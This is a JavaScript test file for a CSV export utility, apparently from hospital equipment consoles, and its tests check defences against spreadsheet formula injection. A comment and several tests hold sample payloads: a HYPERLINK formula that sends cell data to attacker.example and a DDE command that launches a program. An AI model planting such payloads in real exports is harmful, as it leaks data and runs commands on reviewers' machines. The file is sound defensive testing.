// Tests for src/utils/csv.js.
//
// Why this file exists
// --------------------
// Twenty-one hub consoles each shipped the same CSV exporter:
//
//   const csv = rows.map((r) => r.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\n");
//
// Correct on quotes, and - because every field is quoted unconditionally - on commas and newlines
// too. Wrong on three other things, and the first is a security defect: a spreadsheet evaluates a
// field beginning with `=`, `+`, `-`, `@`, a tab or a carriage return as a formula, and quoting does
// not prevent it, because the CSV parser strips the quotes before the cell is evaluated.
//
// Every field in these exports is attacker-influenced. Equipment names, patient identifiers, batch
// numbers, technician notes and alert bodies all come from user input or a supplier feed. An
// equipment note reading `=HYPERLINK("https://attacker.example/?d="&A1,"Report")` is a live
// exfiltration link in the reviewer's spreadsheet.
//
// The tests are organised around the two things that can go wrong: failing to neutralise a payload,
// and neutralising something that was not one. The second matters more than it sounds - `-80` is a
// freezer setpoint and `-14.2` is a room pressure, and turning those into text breaks every sum in
// the sheet the export exists to feed.

import { describe, it, expect, vi, afterEach } from "vitest";
import { escapeCsvField, rowsToCsv, downloadCsv } from "../../utils/csv";

/** Strips the wrapping quotes so a case can assert on the cell contents. */
const contents = (value) => escapeCsvField(value).slice(1, -1);

describe("escapeCsvField - formula neutralisation", () => {
  it("neutralises every trigger character", () => {
    // The set a spreadsheet treats as the start of a formula. Note that the `+` case has to be a
    // payload rather than `+1`: a well-formed number is exempt, which is the subject of the
    // "values that must not be touched" group below.
    expect(contents("=1+1")).toBe("'=1+1");
    expect(contents("+SUM(A1)")).toBe("'+SUM(A1)");
    expect(contents("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(contents("\tSUM(A1)")).toBe("'\tSUM(A1)");
    expect(contents("\rSUM(A1)")).toBe("'\rSUM(A1)");
  });

  it("neutralises a HYPERLINK exfiltration payload", () => {
    const payload = '=HYPERLINK("https://attacker.example/?d="&A1&A2,"Click for report")';
    // The quote doubling still happens, so the payload also survives as readable text.
    expect(escapeCsvField(payload)).toBe(
      `"'=HYPERLINK(""https://attacker.example/?d=""&A1&A2,""Click for report"")"`
    );
  });

  it("neutralises a DDE command payload", () => {
    expect(contents("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
  });

  it("neutralises a payload that also needs RFC 4180 quoting", () => {
    // Both mechanisms have to apply; an earlier draft applied the guard after quoting, which put the
    // apostrophe outside the quotes where the parser drops it.
    expect(escapeCsvField('=1+1,"x"')).toBe(`"'=1+1,""x"""`);
  });

  it("can be turned off for a machine-bound CSV", () => {
    expect(contents("=1+1")).toBe("'=1+1");
    expect(escapeCsvField("=1+1", { formulaSafe: false })).toBe('"=1+1"');
  });
});

describe("escapeCsvField - values that must not be touched", () => {
  it("leaves a negative number alone", () => {
    // -80 is an ultra-low freezer setpoint and -14.2 Pa is an isolation room pressure. Both appear
    // in these exports, both start with a trigger character, and neither can start a formula.
    expect(contents(-80)).toBe("-80");
    expect(contents("-80")).toBe("-80");
    expect(contents("-14.2")).toBe("-14.2");
    expect(contents(-0.5)).toBe("-0.5");
  });

  it("leaves a signed, decimal or exponent-form number alone", () => {
    expect(contents("+1.5")).toBe("+1.5");
    expect(contents("-.5")).toBe("-.5");
    expect(contents("1e-3")).toBe("1e-3");
    expect(contents("-2.5E+10")).toBe("-2.5E+10");
  });

  it("still neutralises something that only looks numeric", () => {
    // The exemption is for well-formed numbers, not for anything starting with a digit-ish shape.
    expect(contents("-80=1+1")).toBe("'-80=1+1");
    expect(contents("+1-800-CALL")).toBe("'+1-800-CALL");
    expect(contents("-")).toBe("'-");
  });

  it("leaves ordinary text alone", () => {
    expect(contents("Ventilator A-200")).toBe("Ventilator A-200");
    expect(contents("MRN-4471")).toBe("MRN-4471");
    expect(contents("Chair vacant")).toBe("Chair vacant");
  });
});

describe("escapeCsvField - RFC 4180", () => {
  it("doubles embedded quotes", () => {
    expect(escapeCsvField('a "quoted" word')).toBe('"a ""quoted"" word"');
  });

  it("survives a comma and a newline inside a field", () => {
    expect(escapeCsvField("Bay 3, Ward B")).toBe('"Bay 3, Ward B"');
    expect(escapeCsvField("line one\nline two")).toBe('"line one\nline two"');
  });

  it("renders null and undefined as an empty field rather than as text", () => {
    // `String(null)` is "null", which is how an empty cell becomes the word null in a report.
    expect(escapeCsvField(null)).toBe('""');
    expect(escapeCsvField(undefined)).toBe('""');
  });

  it("renders numbers, booleans and zero correctly", () => {
    expect(contents(0)).toBe("0");
    expect(contents(false)).toBe("false");
    expect(contents(12.5)).toBe("12.5");
  });
});

describe("rowsToCsv", () => {
  const table = [
    ["id", "name", "setpoint"],
    ["EQ-1", "Freezer A", -80],
    ["EQ-2", "=cmd|'/c calc'!A1", -70],
  ];

  it("separates rows with CRLF, as RFC 4180 specifies", () => {
    // LF-only output is read as a single row by some Windows tooling.
    const csv = rowsToCsv(table);
    expect(csv).toContain("\r\n");
    expect(csv.split("\r\n")).toHaveLength(3);
  });

  it("prefixes a UTF-8 byte order mark", () => {
    // Without it Excel on Windows decodes the file as the system code page, corrupting every
    // non-ASCII character - the µ in µg/mL, the ° in °C, and any non-English name.
    expect(rowsToCsv(table).charCodeAt(0)).toBe(0xfeff);
    expect(rowsToCsv(table, { bom: false }).charCodeAt(0)).not.toBe(0xfeff);
  });

  it("round-trips a non-ASCII value", () => {
    expect(rowsToCsv([["unit"], ["µg/mL"], ["-80 °C"]])).toContain("µg/mL");
  });

  it("neutralises a payload anywhere in the table while keeping the setpoints numeric", () => {
    const csv = rowsToCsv(table);
    expect(csv).toContain(`"'=cmd|'/c calc'!A1"`);
    expect(csv).toContain('"-80"');
    expect(csv).not.toContain(`"'-80"`);
  });

  it("handles an empty table and a header-only table", () => {
    expect(rowsToCsv([], { bom: false })).toBe("");
    expect(rowsToCsv([["a", "b"]], { bom: false })).toBe('"a","b"');
  });

  it("passes formulaSafe through to the fields", () => {
    expect(rowsToCsv([["=1+1"]], { bom: false, formulaSafe: false })).toBe('"=1+1"');
  });
});

describe("downloadCsv", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("names the file, writes the CSV and reports the data row count", () => {
    const created = [];
    vi.spyOn(URL, "createObjectURL").mockImplementation((blob) => {
      created.push(blob);
      return "blob:test";
    });
    const revoke = vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});

    const rows = downloadCsv("icu-devices.csv", [
      ["id", "status"],
      ["DEV-1", "online"],
      ["DEV-2", "offline"],
    ]);

    expect(click).toHaveBeenCalledTimes(1);
    expect(rows).toBe(2);
    expect(created).toHaveLength(1);
    expect(created[0].type).toBe("text/csv;charset=utf-8;");
    // The object URL has to be released, or the blob is pinned for the life of the document - and
    // these consoles export on every tab switch.
    expect(revoke).toHaveBeenCalledWith("blob:test");
  });

  it("removes the anchor it appended", () => {
    vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:test");
    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});

    const before = document.body.children.length;
    downloadCsv("x.csv", [["a"]]);

    expect(document.body.children.length).toBe(before);
  });

  it("reports zero data rows for a header-only export", () => {
    vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:test");
    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});

    expect(downloadCsv("x.csv", [["a", "b"]])).toBe(0);
    expect(downloadCsv("x.csv", [])).toBe(0);
  });
});

describe("no console still serialises its own CSV", () => {
  it("has no page building a CSV by hand", async () => {
    // The point of the module is that there is one implementation. A page that grows its own again
    // silently loses the formula guard, the CRLF and the BOM - which is exactly how twenty-one of
    // them came to be missing it.
    const fs = await import("fs");
    const path = await import("path");
    const { fileURLToPath } = await import("url");

    const here = path.dirname(fileURLToPath(import.meta.url));
    const pagesRoot = path.resolve(here, "..", "..", "pages");
    const offenders = [];

    (function walk(directory) {
      for (const entry of fs.readdirSync(directory, { withFileTypes: true })) {
        const absolute = path.join(directory, entry.name);
        if (entry.isDirectory()) {
          walk(absolute);
        } else if (/\.jsx?$/.test(entry.name) && !entry.name.endsWith(".test.jsx")) {
          const source = fs.readFileSync(absolute, "utf8");
          if (/String\((?:c|cell|s|v|value)\)\.replace\(\/"\/g/.test(source)) {
            offenders.push(path.relative(pagesRoot, absolute));
          }
        }
      }
    })(pagesRoot);

    expect(offenders).toEqual([]);
  });
});
